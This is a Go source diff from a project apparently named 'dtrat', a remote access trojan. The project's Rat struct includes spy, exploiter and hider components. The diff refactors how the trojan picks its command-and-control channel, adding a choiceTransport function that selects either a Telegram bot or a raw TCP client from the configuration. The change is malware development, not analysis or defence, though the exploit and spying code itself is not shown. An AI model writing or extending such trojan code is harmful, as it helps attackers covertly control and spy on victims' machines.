@@ -8,11 +8,11 @@ import (
 	"dtrat/spy"
 	"dtrat/transport"
 	"fmt"
-	"io"
+	"time"
 )
 
 type Rat struct {
-	Bot       transport.Transport
+	Transport transport.Transport
 	Engine    *engine.Engine
 	Exploiter *exploiter.Exploiter
 	Hider     *hider.Hider
@@ -28,13 +28,9 @@ func NewRat() (*Rat, error) {
 		return nil, fmt.Errorf("NewConfig: %w", err)
 	}
 
-	bot, err := transport.NewTgBot(cfg)
-	if err == io.EOF {
-		return nil, fmt.Errorf("Отсутсвует соединение")
-	}
-
+	tl, err := choiceTransport(cfg)
 	if err != nil {
-		return nil, fmt.Errorf("NewBot: %w", err)
+		return nil, fmt.Errorf("choiceTransport: %w", err)
 	}
 
 	eng, err := engine.NewEngine(cfg)
@@ -58,7 +54,7 @@ func NewRat() (*Rat, error) {
 	}
 
 	rat := Rat{
-		Bot:       bot,
+		Transport: tl,
 		Engine:    eng,
 		Exploiter: exp,
 		Hider:     hdr,
@@ -68,4 +64,19 @@ func NewRat() (*Rat, error) {
 	}
 
 	return &rat, nil
+}
+
+func choiceTransport(cfg config.Config) (transport.Transport, error) {
+	switch cfg.General.UseTransport {
+	case "telegram":
+		return transport.NewTgBot(cfg)
+	case "tcp":
+		return transport.NewTCPClient(
+			cfg.Transport.TCP.Addr,
+			time.Duration(cfg.Transport.TCP.ReadTimeout),
+			time.Duration(cfg.Transport.TCP.WriteTimeout),
+		), nil
+	default:
+		return nil, fmt.Errorf("неизвестный транспорт: %s", cfg.General.UseTransport)
+	}
 }
